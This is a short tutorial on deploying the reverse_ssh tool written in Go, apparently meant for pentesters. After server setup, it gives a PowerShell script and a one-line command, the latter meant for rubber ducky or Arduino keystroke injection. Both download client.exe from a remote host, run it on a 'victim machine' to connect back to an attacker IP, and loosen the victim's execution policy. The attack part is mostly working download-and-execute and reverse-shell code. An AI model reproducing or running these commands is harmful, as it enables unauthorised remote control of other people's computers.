## Reverse ssh using Go language
**Check NHAS Repositary for Source Code -> <a href ="https://github.com/NHAS/reverse_ssh" > Redirect </a>**

Check this Content at Medium where i Explained Detailed <a href="https://medium.com/@smukx" > Medium </a> 

download the server file from GitHub
 Create a new rsa key for ssh server and name it as authorized_keys
Note : Only Name the key as authorized_keys 

Download Files From Releases : <a href="https://github.com/NHAS/reverse_ssh/releases/tag/v2.1.3" > Click Here </a>

`ssh-keygen -t rsa`

The creted file contains at $HOME/.ssh path
After Creating that , cp the file id_rsa.pub file to the path where you kept the server file . 
rename the file as authorized_keys

start the server `./server 0.0.0.0:1234 --insecure`

To connect with server . do normal ssh 

After connecting . help command will do us a great work !
If you want to pentest together . just ask you mate to create an rsa key and add the key to the authorized_keys file .  
Attack scenario 

`./server.exe -d <ip>:<port>`

so if you executed the command with the file . you can connect with the server . 
Automation using powershell
So using poweshell i have written some script to download the client and execute the command .

```
$DownloadUrl = "https://github.com/NHAS/reverse_ssh/releases/download/v2.1.3/client.exe"
$DownloadPath = "$env:TEMP\client.exe"

# Replace your Ip with port 
$Command = "client.exe -d 10.10.10.10:1234"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($DownloadUrl, $DownloadPath)

Start-Process -FilePath $DownloadPath -ArgumentList $Command
```

On Victim machine . Type `Set-ExecutionPolicy Unrestricted` 

Here is the single line command version of the scritp that can be used for rubber ducky , arduino board etc ..
```
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://example.com/client.exe', \"$env:TEMP\client.exe\"); Start-Process -FilePath \"$env:TEMP\client.exe\" -ArgumentList 'client.exe -d 10.10.10.10:1234'}
```
